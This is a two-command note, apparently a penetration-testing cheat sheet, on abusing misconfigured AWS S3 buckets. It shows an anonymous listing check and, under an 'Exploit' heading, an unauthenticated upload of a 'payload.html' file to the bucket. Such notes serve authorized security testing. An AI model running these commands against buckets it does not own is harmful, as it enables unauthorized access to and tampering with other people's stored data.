# AWS Misconfiguration check
```
aws s3 ls s3://bucket name  --no-sign-request
```
## Exploit
```
aws s3 cp payload.html s3://bucket name  --no-sign-request
```
